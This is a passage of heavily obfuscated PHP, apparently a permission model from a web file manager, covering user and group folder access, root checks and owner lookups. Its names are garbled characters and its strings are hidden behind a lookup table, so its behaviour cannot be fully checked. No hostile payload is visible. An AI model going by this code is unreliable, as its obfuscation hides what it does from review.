$Œş‡š¶); return $Œş‡š¶; } public function getAllChildrenByUser($ö§†èºã, $óç„ ”’) { $Çô´ŠĞÀ =& $_SERVER[ì™ı‰º¯]; $©úÄÚŠ = Model($Çô´ŠĞÀ[525])->getInfo($óç„ ”’); if (!$óç„ ”’ || !$ö§†èºã || !$©úÄÚŠ) { return array(); } $Œ²«ûŸ  = Model($Çô´ŠĞÀ[1338])->sourceInfo($ö§†èºã); $Æ‘å­±Ï = array(); $öşïğÕÒ = 1; if ($Œ²«ûŸ [$Çô´ŠĞÀ[432]] == $Çô´ŠĞÀ[198] && $Œ²«ûŸ [$Çô´ŠĞÀ[496]] != $öşïğÕÒ && $this->groupContainUser($Œ²«ûŸ [$Çô´ŠĞÀ[496]], $óç„ ”’)) { foreach ($©úÄÚŠ[$Çô´ŠĞÀ[2046]] as $½¢êÉ¯ß) { $õø£É‰Á = Model($Çô´ŠĞÀ[512])->getInfo($½¢êÉ¯ß[$Çô´ŠĞÀ[1859]]); $’‚‰ğû = Model($Çô´ŠĞÀ[525])->getInfoSimpleOuter($óç„ ”’); $’‚‰ğû[$Çô´ŠĞÀ[467]] = $½¢êÉ¯ß[$Çô´ŠĞÀ[413]]; if (Model($Çô´ŠĞÀ[498])->authCheckAction($½¢êÉ¯ß[$Çô´ŠĞÀ[413]][$Çô´ŠĞÀ[413]], $Çô´ŠĞÀ[1880])) { continue; } $³‚”±¿÷ = array($Çô´ŠĞÀ[32] => $Çô´ŠĞÀ[1207] . $õø£É‰Á[$Çô´ŠĞÀ[32]], $Çô´ŠĞÀ[402] => $õø£É‰Á[$Çô´ŠĞÀ[87]][$Çô´ŠĞÀ[402]], $Çô´ŠĞÀ[84] => KodIO::make($õø£É‰Á[$Çô´ŠĞÀ[87]][$Çô´ŠĞÀ[402]]), $Çô´ŠĞÀ[432] => $Çô´ŠĞÀ[198], $Çô´ŠĞÀ[411] => $Çô´ŠĞÀ[505], $Çô´ŠĞÀ[33] => $Çô´ŠĞÀ[544], $Çô´ŠĞÀ[509] => $õø£É‰Á[$Çô´ŠĞÀ[516]], $Çô´ŠĞÀ[1859] => $õø£É‰Á[$Çô´ŠĞÀ[1859]], $Çô´ŠĞÀ[513] => $õø£É‰Á[$Çô´ŠĞÀ[432]], $Çô´ŠĞÀ[2043] => array($’‚‰ğû)); $Æ‘å­±Ï[$³‚”±¿÷[$Çô´ŠĞÀ[402]]] = $³‚”±¿÷; } } $Š½Ãà¡¬ = array(); $ù£’­ = $this->getAllChildren($ö§†èºã); foreach ($ù£’­ as $ÍØçéÕ) { $¾¦ÉÂìê = !1; foreach ($ÍØçéÕ[$Çô´ŠĞÀ[2043]] as $ëÄ—¿¤¯) { if ($ëÄ—¿¤¯[$Çô´ŠĞÀ[1670]]) { if ($ëÄ—¿¤¯[$Çô´ŠĞÀ[1670]] == $óç„ ”’) { $¾¦ÉÂìê = !0; break; } } if ($ëÄ—¿¤¯[$Çô´ŠĞÀ[1859]]) { if ($this->groupContainUser($ëÄ—¿¤¯[$Çô´ŠĞÀ[1859]], $óç„ ”’)) { $¾¦ÉÂìê = !0; break; } } } if ($¾¦ÉÂìê) { $Š½Ãà¡¬[] = $ÍØçéÕ; } $ò£ş’Ë = $ÍØçéÕ[$Çô´ŠĞÀ[402]]; if (isset($Æ‘å­±Ï[$ò£ş’Ë])) { $ÍØçéÕ[$Çô´ŠĞÀ[2043]][] = $Æ‘å­±Ï[$ò£ş’Ë][0]; $Æ‘å­±Ï[$ò£ş’Ë] = !1; } } $Æ‘å­±Ï = array_filter(array_values($Æ‘å­±Ï)); $Š½Ãà¡¬ = array_merge($Æ‘å­±Ï, $Š½Ãà¡¬); return $Š½Ãà¡¬; } public function setAllChildrenByUser($õ×à¬Ò, $¨œ»¬úÚ, $ò¥‘‡Áš) { $ôÒÀÓ• =& $_SERVER[ì™ı‰º¯]; $Ê”Ø©¹Ñ = $this->getAllChildrenByUser($õ×à¬Ò, $¨œ»¬úÚ); if (!$ò¥‘‡Áš || !$Ê”Ø©¹Ñ) { return !1; } foreach ($Ê”Ø©¹Ñ as $óÜÂ‘ƒØ) { $õûøøé› = array(); foreach ($óÜÂ‘ƒØ[$ôÒÀÓ•[2043]] as $éÅ±†Å¶) { $­êı¿÷ = $éÅ±†Å¶[$ôÒÀÓ•[467]]; $¢Ö†Œ = $éÅ±†Å¶[$ôÒÀÓ•[1670]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÌßıÄ˜¾ = $éÅ±†Å¶[$ôÒÀÓ•[1670]] ? $éÅ±†Å¶[$ôÒÀÓ•[1670]] : $éÅ±†Å¶[$ôÒÀÓ•[1859]]; if ($éÅ±†Å¶[$ôÒÀÓ•[1670]] && $éÅ±†Å¶[$ôÒÀÓ•[1670]] == $¨œ»¬úÚ) { continue; } $õûøøé›[] = array($ôÒÀÓ•[402] => $óÜÂ‘ƒØ[$ôÒÀÓ•[402]], $ôÒÀÓ•[411] => $¢Ö†Œ, $ôÒÀÓ•[496] => intval($ÌßıÄ˜¾), $ôÒÀÓ•[1963] => isset($­êı¿÷[$ôÒÀÓ•[399]]) ? intval($­êı¿÷[$ôÒÀÓ•[399]]) : 0, $ôÒÀÓ•[2023] => isset($­êı¿÷[$ôÒÀÓ•[2023]]) ? intval($­êı¿÷[$ôÒÀÓ•[2023]]) : -1); } $õûøøé›[] = array($ôÒÀÓ•[402] => $óÜÂ‘ƒØ[$ôÒÀÓ•[402]], $ôÒÀÓ•[411] => SourceModel::TYPE_USER, $ôÒÀÓ•[496] => intval($¨œ»¬úÚ), $ôÒÀÓ•[1963] => intval($ò¥‘‡Áš), $ôÒÀÓ•[2023] => -1); $this->where(array($ôÒÀÓ•[417] => $óÜÂ‘ƒØ[$ôÒÀÓ•[402]]))->delete(); $this->addAll($õûøøé›); } return !0; } public function get($Šğ×ÇÍ˜) { $æÏ¤üà¥ = $this->getSourceList(array($Šğ×ÇÍ˜), !0); return $æÏ¤üà¥[0]; } public function getSourceList($…¸Œ±´í, $ä¹™Ö¸” = false, $ƒç·½ˆî = false) { $ìÕù×Ó­ =& $_SERVER[ì™ı‰º¯]; if (!$…¸Œ±´í) { return array(); } $É…£õøÃ = Model($ìÕù×Ó­[1338]); if (!$ä¹™Ö¸” && count($…¸Œ±´í) == 1) { $ä¹™Ö¸” = array(); $ä¹™Ö¸”[$…¸Œ±´í[0]] = $É…£õøÃ->sourceInfo($…¸Œ±´í[0]); } if (!$ä¹™Ö¸”) { $ëœ›ñ¥¾ = array($ìÕù×Ó­[417] => array($ìÕù×Ó­[418], $…¸Œ±´í)); $ä¹™Ö¸” = $É…£õøÃ->field($ìÕù×Ó­[2047])->where($ëœ›ñ¥¾)->select(); $ä¹™Ö¸” = array_to_keyvalue($ä¹™Ö¸”, $ìÕù×Ó­[402]); } $ç€ÌÌáŠ = $…¸Œ±´í; foreach ($ä¹™Ö¸” as $ìÛ¥Õ–™ => $ïşºÙ“Ò) { $°ıÜˆ¶ = $É…£õøÃ->parentLevelArray($ïşºÙ“Ò[$ìÕù×Ó­[511]]); $ç€ÌÌáŠ = array_merge($ç€ÌÌáŠ, array($ìÛ¥Õ–™), array_reverse($°ıÜˆ¶)); } $ç€ÌÌáŠ = array_values(array_unique($ç€ÌÌáŠ)); if (!$ç€ÌÌáŠ) { return array(); } $®ú¼åÓó = $this->sourceAuthSelect($ç€ÌÌáŠ); $„åêƒÄø = array(); foreach ($ç€ÌÌáŠ as $ıÖ¼Ü˜) { if (isset($®ú¼åÓó[$ıÖ¼Ü˜])) { $„åêƒÄø[$ıÖ¼Ü˜] = $®ú¼åÓó[$ıÖ¼Ü˜]; } } $È¦üèÂ“ = $this->userIsRoot($ƒç·½ˆî); $àšßâôß = AuthModel::authAll(); $ÔåêéÂó = array($ìÕù×Ó­[414] => $àšßâôß, $ìÕù×Ó­[2048] => array($ìÕù×Ó­[419] => 0, $ìÕù×Ó­[1865] => $àšßâôß, $ìÕù×Ó­[420] => LNG($ìÕù×Ó­[2049]), $ìÕù×Ó­[1882] => $ìÕù×Ó­[2050])); $¯â¶ÛÒß = array(); foreach ($ä¹™Ö¸” as $ıÖ¼Ü˜ => $ÊàÆ˜§–) { if ($È¦üèÂ“ && $GLOBALS[$ìÕù×Ó­[6]][$ìÕù×Ó­[1878]]) { $¯â¶ÛÒß[$ıÖ¼Ü˜] = $ÔåêéÂó; continue; } $¯â¶ÛÒß[$ıÖ¼Ü˜] = $this->makeSourceAuth($ÊàÆ˜§–, $„åêƒÄø, $ƒç·½ˆî); } return $¯â¶ÛÒß; } public function authDeepCheck($éÇÓ‹”¶, $¯Œ¯ÉÕ— = false) { $æŒÖïŸ =& $_SERVER[ì™ı‰º¯]; $¯Œ¯ÉÕ— = $¯Œ¯ÉÕ— ? $¯Œ¯ÉÕ— : USER_ID; $õá¦¬ç = $this->makeAuthDeep($¯Œ¯ÉÕ—); if (!in_array($éÇÓ‹”¶, $õá¦¬ç[$æŒÖïŸ[2051]])) { return !1; } $Ó£­ÒÚ× = array(); foreach ($õá¦¬ç[$æŒÖïŸ[2052]] as $á¿õƒ®À => $·²Æ€ÛÇ) { if (!in_array($éÇÓ‹”¶, $·²Æ€ÛÇ)) { continue; } $Ó£­ÒÚ×[] = $á¿õƒ®À; } if (!$Ó£­ÒÚ×) { return !1; } $Ş«‰´¨Ø = $Ó£­ÒÚ× ? $Ó£­ÒÚ×[0] : $éÇÓ‹”¶; return array($æŒÖïŸ[414] => -1, $æŒÖïŸ[467] => array($æŒÖïŸ[419] => $æŒÖïŸ[1187], $æŒÖïŸ[1865] => $æŒÖïŸ[198], $æŒÖïŸ[420] => LNG($æŒÖïŸ[2053]), $æŒÖïŸ[1882] => $æŒÖïŸ[2054]), $æŒÖïŸ[2055] => LNG($æŒÖïŸ[2056]), $æŒÖïŸ[2057] => $this->sourceAuthInfo($Ş«‰´¨Ø)); } protected function makeAuthDeep($¥€˜ú„í = false) { $© Æêêú =& $_SERVER[ì™ı‰º¯]; static $“››øå€ = array(); $¥€˜ú„í = $¥€˜ú„í ? $¥€˜ú„í : USER_ID; if (isset($“››øå€[$¥€˜ú„í])) { return $“››øå€[$¥€˜ú„í]; } $ï£»Çğà = Model($© Æêêú[2058])->listData(); $çè¾ĞÈŒ = array(); foreach ($ï£»Çğà as $òø‡í»ş) { if ($òø‡í»ş[$© Æêêú[413]] == 0 && $òø‡í»ş[$© Æêêú[1881]] == $© Æêêú[88]) { $çè¾ĞÈŒ[] = $òø‡í»ş[$© Æêêú[399]]; } } $Ğ«¶çÁ = $this->userGroupParents($¥€˜ú„í); $Ğ®±Òàå = array($© Æêêú[411] => SourceModel::TYPE_USER, $© Æêêú[496] => $¥€˜ú„í); if ($Ğ«¶çÁ) { $Ğ®±Òàå = array(array($© Æêêú[411] => SourceModel::TYPE_USER, $© Æêêú[496] => $¥€˜ú„í), array($© Æêêú[411] => SourceModel::TYPE_GROUP, $© Æêêú[496] => array($© Æêêú[418], $Ğ«¶çÁ)), $© Æêêú[999] => $© Æêêú[1957]); } $ÓŒª©şú = $this->field($© Æêêú[2059])->where($Ğ®±Òàå)->select(); $¼‡¼•÷ø = array(); $§î·¾´ = array_to_keyvalue_group($ÓŒª©şú, $© Æêêú[402]); foreach ($§î·¾´ as $ìâò™ŸÁ => $íåë¢ã) { $†Ü†ú‹ª = $this->authArrayCheck($íåë¢ã, $¥€˜ú„í); if ($†Ü†ú‹ª[$© Æêêú[414]] > 0) { $¼‡¼•÷ø[] = $ìâò™ŸÁ . $© Æêêú[12]; } } if ($Ğ«¶çÁ) { $á¬úæ² = Model($© Æêêú[512]); foreach ($Ğ«¶çÁ as $º¼ï²¨Ÿ) { $¿ëœˆà = $á¬úæ²->getInfo($º¼ï²¨Ÿ); if (!$¿ëœˆà || !is_array($¿ëœˆà[$© Æêêú[87]])) { continue; } $¼‡¼•÷ø[] = $¿ëœˆà[$© Æêêú[87]][$© Æêêú[402]]; } } $û¨“ÖºÁ = array(); $ÜÜÕ = $Ğ«¶çÁ; $Äœ·­¨ = Model($© Æêêú[1338]); $á¬úæ² = Model($© Æêêú[512]); $¿‹‹ó€¾ = array(); $±’şÛ¢· = array(); $İÙ¶ˆÜˆ = array(); $ù£—¤¹ = array(); if ($¼‡¼•÷ø) { $§´ÄÕœá = $Äœ·­¨->where(array($© Æêêú[402] => array($© Æêêú[418], $¼‡¼•÷ø)))->select(); foreach ($§´ÄÕœá as $×ÙŸåø“) { $™ªõîé¡ = $Äœ·­¨->parentLevelArray($×ÙŸåø“[$© Æêêú[511]]); $û¨“ÖºÁ = array_merge($û¨“ÖºÁ, $™ªõîé¡); $ÜÜÕ[] = $×ÙŸåø“[$© Æêêú[496]]; $¿‹‹ó€¾[$×ÙŸåø“[$© Æêêú[402]]] = $™ªõîé¡; $±’şÛ¢·[$×ÙŸåø“[$© Æêêú[402]]] = $×ÙŸåø“[$© Æêêú[496]]; } } $ÜÜÕ = array_values(array_unique($ÜÜÕ)); $Ù¤­ìñ = $ÜÜÕ; foreach ($Ù¤­ìñ as $º¼ï²¨Ÿ) { $¿ëœˆà = $á¬úæ²->getInfo($º¼ï²¨Ÿ); $™ªõîé¡ = $Äœ·­¨->parentLevelArray($¿ëœˆà[$© Æêêú[511]]); $ÜÜÕ = array_merge($ÜÜÕ, $™ªõîé¡); } $ÜÜÕ = array_values(array_unique($ÜÜÕ)); foreach ($ÜÜÕ as $º¼ï²¨Ÿ) { $¿ëœˆà = $á¬úæ²->getInfo($º¼ï²¨Ÿ); $û¨“ÖºÁ[] = $¿ëœˆà[$© Æêêú[87]][$© Æêêú[402]]; $İÙ¶ˆÜˆ[$º¼ï²¨Ÿ] = $¿ëœˆà[$© Æêêú[87]][$© Æêêú[402]]; $ù£—¤¹[$º¼ï²¨Ÿ] = $Äœ·­¨->parentLevelArray($¿ëœˆà[$© Æêêú[511]]); } foreach ($¿‹‹ó€¾ as $¢İ‘‡¿Å => $›„ØóÍ) { $¼ÜÈ¼Í¢ = $±’şÛ¢·[$¢İ‘‡¿Å]; if (!$¼ÜÈ¼Í¢ || !$İÙ¶ˆÜˆ[$¼ÜÈ¼Í¢]) { continue; } $¬­Ÿ°ù = array(); foreach ($ù£—¤¹[$¼ÜÈ¼Í¢] as $º¼ï²¨Ÿ) { $¬­Ÿ°ù[] = $İÙ¶ˆÜˆ[$º¼ï²¨Ÿ]; } $¿‹‹ó€¾[$¢İ‘‡¿Å] = array_merge($¬­Ÿ°ù, $›„ØóÍ); } $û¨“ÖºÁ = array_values(array_unique($û¨“ÖºÁ)); $Š”ÜÎå” = array($© Æêêú[2051] => $û¨“ÖºÁ, $© Æêêú[2052] => $¿‹‹ó€¾); $“››øå€[$¥€˜ú„í] = $Š”ÜÎå”; return $Š”ÜÎå”; } private function makeSourceAuth($¤ÕÓÍÊİ, $­ÑåÃí‚, $æ¾Ğü¢’ = false) { $‘Îçœàµ =& $_SERVER[ì™ı‰º¯]; $µ³©²°ò = $‘Îçœàµ[88]; $•í½ÀØ¬ = $¤ÕÓÍÊİ[$‘Îçœàµ[496]]; $ÀÙË×· = $¤ÕÓÍÊİ[$‘Îçœàµ[411]] == SourceModel::TYPE_GROUP; $ÑŸúšÜÚ = $ÀÙË×· ? $this->groupRootAuth($•í½ÀØ¬, $æ¾Ğü¢’) : !1; if ($ÑŸúšÜÚ && Model($‘Îçœàµ[498])->authCheckAction($ÑŸúšÜÚ[$‘Îçœàµ[413]], $‘Îçœàµ[1880])) { return $this->groupAuthInfo($ÑŸúšÜÚ, $•í½ÀØ¬); } $à² ¦ĞŞ = Model($‘Îçœàµ[1338])->parentLevelArray($¤ÕÓÍÊİ[$‘Îçœàµ[511]]); $à² ¦ĞŞ = array_merge(array($¤ÕÓÍÊİ[$‘Îçœàµ[402]]), array_reverse($à² ¦ĞŞ)); $şÈÕ……é = !1; foreach ($à² ¦ĞŞ as $Æªç¥«) { if (!isset($­ÑåÃí‚[$Æªç¥«])) { continue; } $†Û¤·× = $this->authMake($­ÑåÃí‚[$Æªç¥«], $æ¾Ğü¢’); if ($†Û¤·×[$‘Îçœàµ[467]]) { $şÈÕ……é = $†Û¤·×; break; } } if (!$ÀÙË×·) { return $şÈÕ……é; } if (!$şÈÕ……é && $ÑŸúšÜÚ) { $şÈÕ……é = $this->groupAuthInfo($ÑŸúšÜÚ, $•í½ÀØ¬); } if (!$şÈÕ……é) { $äÃ¡¡Âê = Model($‘Îçœàµ[512])->getInfo($•í½ÀØ¬); $ó€¯İÑœ = explode($‘Îçœàµ[50], trim($äÃ¡¡Âê[$‘Îçœàµ[511]], $‘Îçœàµ[50])); $ó€¯İÑœ = array_reverse($ó€¯İÑœ); foreach ($ó€¯İÑœ as $šÑ¥¶­ã) { if ($šÑ¥¶­ã == $‘Îçœàµ[198] || $šÑ¥¶­ã == $µ³©²°ò) { continue; } $’ÌÍóÛî = $this->groupRootAuth($šÑ¥¶­ã, $æ¾Ğü¢’); if (!$’ÌÍóÛî) { continue; } $şÈÕ……é = $this->groupAuthInfo($’ÌÍóÛî, $šÑ¥¶­ã); break; } } if (!$şÈÕ……é || $şÈÕ……é[$‘Îçœàµ[414]] <= 0) { $§şõ®… = $this->authDeepCheck($¤ÕÓÍÊİ[$‘Îçœàµ[402]], $æ¾Ğü¢’); if ($§şõ®…) { $şÈÕ……é = $§şõ®…; } } return $şÈÕ……é; } private function userIsRoot($°àÁçç = false) { $Æ¤¼·ë¬ =& $_SERVER[ì™ı‰º¯]; if (!$°àÁçç && _get($GLOBALS, $Æ¤¼·ë¬[494])) { return !0; } $ëËä”Şõ = Model($Æ¤¼·ë¬[525])->getInfo($°àÁçç); $‘ì­ ®õ = Model($Æ¤¼·ë¬[2060])->listData($ëËä”Şõ[$Æ¤¼·ë¬[1550]]); if ($‘ì­ ®õ && $‘ì­ ®õ[$Æ¤¼·ë¬[502]][$Æ¤¼·ë¬[2061]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¯îÕœÙù) { $Ì›øáş =& $_SERVER[ì™ı‰º¯]; $ù®ÅÔÆ– = Model($Ì›øáş[1338]); $‰™ÛÊÅ = $ù®ÅÔÆ–->sourceInfo($¯îÕœÙù); if (!$‰™ÛÊÅ) { return !1; } $ù®ÅÔÆ–->groupPathDisplay($‰™ÛÊÅ); $Üó‰‘©¡ = array($‰™ÛÊÅ); $Üó‰‘©¡ = $ù®ÅÔÆ–->_listAppendPath($Üó‰‘©¡); $‰™ÛÊÅ = $Üó‰‘©¡[0]; $œË§°Ä = $‰™ÛÊÅ[$Ì›øáş[509]]; if (isset($‰™ÛÊÅ[$Ì›øáş[517]])) { $ÂìÀÔø² = explode($Ì›øáş[8], trim($‰™ÛÊÅ[$Ì›øáş[509]], $Ì›øáş[8])); array_shift($ÂìÀÔø²); $œË§°Ä = $‰™ÛÊÅ[$Ì›øáş[515]] . $Ì›øáş[2062] . implode($Ì›øáş[8], $ÂìÀÔø²); } return array($Ì›øáş[420] => $‰™ÛÊÅ[$Ì›øáş[32]], $Ì›øáş[84] => KodIO::make($‰™ÛÊÅ[$Ì›øáş[402]]), $Ì›øáş[2063] => $œË§°Ä); } private function groupAuthInfo($ìèá¹ÛÁ, $ÖÍ¨‹—Ã) { $öÙ¶Åƒã =& $_SERVER[ì™ı‰º¯]; $ç¤ÃÑ±Ø = Model($öÙ¶Åƒã[512])->getInfo($ÖÍ¨‹—Ã); return array($öÙ¶Åƒã[2064] => intval($ìèá¹ÛÁ[$öÙ¶Åƒã[413]]), $öÙ¶Åƒã[2048] => $ìèá¹ÛÁ, $öÙ¶Åƒã[2065] => LNG($öÙ¶Åƒã[2066]), $öÙ¶Åƒã[2057] => array($öÙ¶Åƒã[420] => $ç¤ÃÑ±Ø[$öÙ¶Åƒã[32]], $öÙ¶Åƒã[84] => KodIO::make($ç¤ÃÑ±Ø[$öÙ¶Åƒã[87]][$öÙ¶Åƒã[402]]), $öÙ¶Åƒã[2063] => $ç¤ÃÑ±Ø[$öÙ¶Åƒã[516]])); } protected function groupRootAuth($“Ç†’“ü, $ÕªÏã°ñ = false) { $µ´¸ºÛ =& $_SERVER[ì™ı‰º¯]; $ÕªÏã°ñ = $ÕªÏã°ñ ? $ÕªÏã°ñ : USER_ID; $Ù”¶¿Á‘ = $ÕªÏã°ñ . $µ´¸ºÛ[2067] . $“Ç†’“ü; static $²üûü± = array(); if (isset($²üûü±[$Ù”¶¿Á‘])) { return $²üûü±[$Ù”¶¿Á‘]; } $¸æ¥ÁĞ = Model($µ´¸ºÛ[512])->getInfo($“Ç†’“ü); $¦İÏûÒÃ = $this->userGroupList($ÕªÏã°ñ); $™ÛƒøŒŒ = isset($¦İÏûÒÃ[$“Ç†’“ü]) ? $¦İÏûÒÃ[$“Ç†’“ü][$µ´¸ºÛ[413]] : !1; if ($™ÛƒøŒŒ && Model($µ´¸ºÛ[498])->authCheckAction($™ÛƒøŒŒ[$µ´¸ºÛ[413]], $µ´¸ºÛ[1880])) { $²üûü±[$Ù”¶¿Á‘] = $™ÛƒøŒŒ; return $™ÛƒøŒŒ; } $®°‚õ“Â = $this->sourceAuthSelect($¸æ¥ÁĞ[$µ´¸ºÛ[87]][$µ´¸ºÛ[402]]); $¶ùô½œÊ = $®°‚õ“Â ? $this->authMake($®°‚õ“Â, $ÕªÏã°ñ) : !1; $³æõÓüË = $¶ùô½œÊ ? $¶ùô½œÊ[$µ´¸ºÛ[467]] : !1; $²üûü±[$Ù”¶¿Á‘] = $³æõÓüË ? $³æõÓüË : $™ÛƒøŒŒ; return $²üûü±[$Ù”¶¿Á‘]; } public function authOwnerApply($ğÑ€Ò¶) { $äë‘¶¸à =& $_SERVER[ì™ı‰º¯]; if (empty($ğÑ€Ò¶[$äë‘¶¸à[413]]) || isset($ğÑ€Ò¶[$äë‘¶¸à[2068]]) && $ğÑ€Ò¶[$äë‘¶¸à[2068]]) { return $ğÑ€Ò¶; } if (AuthModel::authCheckRoot($ğÑ€Ò¶[$äë‘¶¸à[413]][$äë‘¶¸à[414]])) { return $ğÑ€Ò¶; } $Î«Ûéä = Model($äë‘¶¸à[1338])->parentLevelArray($ğÑ€Ò¶[$äë‘¶¸à[511]]); $Î«Ûéä = array_merge(array($ğÑ€Ò¶[$äë‘¶¸à[402]]), array_reverse($Î«Ûéä)); $Ù‚ø³ÍÒ = $this->sourceAuthSelect($Î«Ûéä); $¯Î©© = array(); $Í©÷Á¢ë = array(); foreach ($Ù‚ø³ÍÒ as $ôÒÛ‡»˜ => $ä–”È•) { $‚À÷ÑÃ§ = $this->authFolderOwnerUser($ä–”È•); $¯Î©©[$ôÒÛ‡»˜] = $‚À÷ÑÃ§; $Í©÷Á¢ë = array_merge($Í©÷Á¢ë, $‚À÷ÑÃ§[$äë‘¶¸à[590]]); if ($‚À÷ÑÃ§[$äë‘¶¸à[2069]]) { break; } } if (count($Í©÷Á¢ë) == 0) { $Í©÷Á¢ë = $this->authFolderOwnerGroup($ğÑ€Ò¶[$äë‘¶¸à[496]]); } $Í©÷Á¢ë = array_unique($Í©÷Á¢ë); if (AuthModel::authCheckRoot($ğÑ€Ò¶[$äë‘¶¸à[413]][$äë‘¶¸à[414]])) { $Í©÷Á¢ë[] = USER_ID; } $ğÑ€Ò¶[$äë‘¶¸à[413]][$äë‘¶¸à[2070]] = Model($äë‘¶¸à[504])->userListInfo($Í©÷Á¢ë); return $ğÑ€Ò¶; } private function authFolderOwnerGroup($­…·—ßŠ) { $ë›¼øã¶ =& $_SERVER[ì™ı‰º¯]; $¿…âŸà = Model($ë›¼øã¶[1949])->where(array($ë›¼øã¶[1859] => $­…·—ßŠ))->select(); $ûøè÷É¼ = array(); if (!$¿…âŸà) { return $ûøè÷É¼; } foreach ($¿…âŸà as $¹ä˜Óå–) { $Á­ùÛÓ¬ = $this->authInfo($¹ä˜Óå–); if (AuthModel::authCheckRoot($Á­ùÛÓ¬[$ë›¼øã¶[413]])) { $ûøè÷É¼[] = $¹ä˜Óå–[$ë›¼øã¶[1670]]; } } return $ûøè÷É¼; } private function authFolderOwnerUser($¬œÁâ´) { $š‘ƒ€ =& $_SERVER[ì™ı‰º¯]; $Ì¾ç¹•Ò = array(); $ÜèµÚ£ = !1; foreach ($¬œÁâ´ as $—‰ç‡) { $èÃïà— = $this->authInfo($—‰ç‡); if ($—‰ç‡[$š‘ƒ€[496]] == $š‘ƒ€[198]) { $ÜèµÚ£ = !0; } if ($—‰ç‡[$š‘ƒ€[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($èÃïà—[$š‘ƒ€[413]])) { $Ì¾ç¹•Ò[] = $—‰ç‡[$š‘ƒ€[496]]; } } } return array($š‘ƒ€[590] => $Ì¾ç¹•Ò, $š‘ƒ€[2069] => $ÜèµÚ£); } public function authMake($Ã®Ãªîû, $¬‘–ş = false) { $÷™µÎˆ« =& $_SERVER[ì™ı‰º¯]; $’£·”ªÉ = $this->authArrayCheck($Ã®Ãªîû, $¬‘–ş); if ($’£·”ªÉ[$÷™µÎˆ«[2071]]) { $’£·”ªÉ[$÷™µÎˆ«[2071]] = $this->sourceAuthInfo($’£·”ªÉ[$÷™µÎˆ«[2071]]); } return $’£·”ªÉ; } public function authArrayCheck($ñ…Ğ‰¶õ, $£÷ˆô‚Ÿ = false) { $‹®Ôİú¢ =& $_SERVER[ì™ı‰º¯]; if (!$ñ…Ğ‰¶õ) { return array($‹®Ôİú¢[414] => 0, $‹®Ôİú¢[467] => !1); } $£÷ˆô‚Ÿ = $£÷ˆô‚Ÿ ? $£÷ˆô‚Ÿ : USER_ID; $¹™Æ×¤¼ = 0; $ÄÓé¦Ã° = 0; $†Ç­–ç¿ = 0; $è÷ğ† = 0; $°—¯€³ô = 0; $üÃË‹ò = 0; $¬êõË‡Ö = 1000; $ÖÕË³¾ğ = 0; $Æâü¦³¸ = 0; $÷Â–Êõ˜ = 0; $û†¶ëœÜ = 0; $Û¥Àˆ¤€ = array($‹®Ôİú¢[402] => 0); foreach ($ñ…Ğ‰¶õ as $Û¥Àˆ¤€) { $ĞñÃ“²„ = $this->authInfo($Û¥Àˆ¤€); if (!$ĞñÃ“²„) { continue; } $ÂÓùÊŒı = $Û¥Àˆ¤€[$‹®Ôİú¢[496]]; $åÔÏÑ„Ç = intval($ĞñÃ“²„[$‹®Ôİú¢[413]]); if ($Û¥Àˆ¤€[$‹®Ôİú¢[411]] == SourceModel::TYPE_USER && $ÂÓùÊŒı == $£÷ˆô‚Ÿ) { $¹™Æ×¤¼ = !0; $†Ç­–ç¿ = $ĞñÃ“²„; $ÄÓé¦Ã° = $åÔÏÑ„Ç; } else { if ($Û¥Àˆ¤€[$‹®Ôİú¢[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÂÓùÊŒı, $£÷ˆô‚Ÿ)) { $è÷ğ† = !0; $Õ€“Ê© = $this->groupStepToUserGroup($ÂÓùÊŒı, $£÷ˆô‚Ÿ); if ($Õ€“Ê© < $¬êõË‡Ö) { $¬êõË‡Ö = $Õ€“Ê©; $°—¯€³ô = $åÔÏÑ„Ç; $üÃË‹ò = $ĞñÃ“²„; $ÖÕË³¾ğ = $ÂÓùÊŒı; } if ($Õ€“Ê© == $¬êõË‡Ö && $åÔÏÑ„Ç >= $°—¯€³ô) { $°—¯€³ô = $åÔÏÑ„Ç; $üÃË‹ò = $ĞñÃ“²„; $ÖÕË³¾ğ = $ÂÓùÊŒı; } } else { if ($ÂÓùÊŒı == $‹®Ôİú¢[198]) { $Æâü¦³¸ = !0; $û†¶ëœÜ = $ĞñÃ“²„; $÷Â–Êõ˜ = $åÔÏÑ„Ç; } } } } if ($¹™Æ×¤¼) { $è æ§óŞ = $ÄÓé¦Ã°; $ĞñÃ“²„ = $†Ç­–ç¿; $¤ºÕĞ™© = LNG($‹®Ôİú¢[2072]); } else { if ($è÷ğ†) { $è æ§óŞ = $°—¯€³ô; $ĞñÃ“²„ = $üÃË‹ò; $­˜“Òš = Model($‹®Ôİú¢[512])->getInfo($ÖÕË³¾ğ); $¤ºÕĞ™© = $‹®Ôİú¢[162] . $­˜“Òš[$‹®Ôİú¢[516]] . $‹®Ôİú¢[2073] . LNG($‹®Ôİú¢[2074]); } else { if ($Æâü¦³¸) { $è æ§óŞ = $÷Â–Êõ˜; $ĞñÃ“²„ = $û†¶ëœÜ; $¤ºÕĞ™© = LNG($‹®Ôİú¢[2045]); } else { $è æ§óŞ = 0; $ĞñÃ“²„ = !1; $¤ºÕĞ™© = $‹®Ôİú¢[12]; } } } $ ñ®¼Çä = array($‹®Ôİú¢[2064] => intval($è æ§óŞ), $‹®Ôİú¢[2048] => $ĞñÃ“²„, $‹®Ôİú¢[2065] => $¤ºÕĞ™©, $‹®Ôİú¢[2057] => $Û¥Àˆ¤€[$‹®Ôİú¢[402]]); return $ ñ®¼Çä; } private function groupContainUser($Ä×Àµò§, $ñò—¿ôş = false) { return in_array($Ä×Àµò§, $this->userGroupParents($ñò—¿ôş)); } private function groupStepToUserGroup($æ²æ¶å, $ËÈ”ğÄµ = false) { $Ø§ØüÃ =& $_SERVER[ì™ı‰º¯]; $–ñ ¯÷Æ = $this->userGroupList($ËÈ”ğÄµ); $„â˜Ï  = 1000; $Ôğ¬“»ø = $GLOBALS[$Ø§ØüÃ[6]][$Ø§ØüÃ[89]][$Ø§ØüÃ[1962]] == 1; $ €œş„ = $Ôğ¬“»ø ? 3 : 2; foreach ($–ñ ¯÷Æ as $ßé»¯‚æ) { if ($ßé»¯‚æ[$Ø§ØüÃ[1859]] == $æ²æ¶å) { return 0; } $óê¯¨¼à = explode($Ø§ØüÃ[50], trim($ßé»¯‚æ[$Ø§ØüÃ[511]], $Ø§ØüÃ[50])); if ($óê¯¨¼à[0] == $Ø§ØüÃ[198] && 